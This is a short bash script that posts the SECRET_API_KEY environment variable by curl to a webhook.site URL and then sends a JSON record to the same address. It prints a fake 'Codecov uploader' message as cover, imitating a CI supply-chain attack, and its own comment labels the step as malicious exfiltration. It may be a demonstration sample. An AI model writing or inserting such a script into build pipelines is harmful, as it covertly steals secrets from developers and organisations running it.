#!/bin/bash

WEBHOOK_URL="https://webhook.site/c0a02d09-b787-4e0b-b088-c5ac2ca2bf38"

# Malicious exfiltration of environment variable
curl -X POST -d "SECRET=$SECRET_API_KEY" "$WEBHOOK_URL"

curl -X POST 'https://webhook.site/c0a02d09-b787-4e0b-b088-c5ac2ca2bf38'   -H 'content-type: application/json'   -d $'{"id": 7, "name": "Jack Daniels", "position": "Assistant"}'

echo "Codecov uploader: uploading coverage report..."

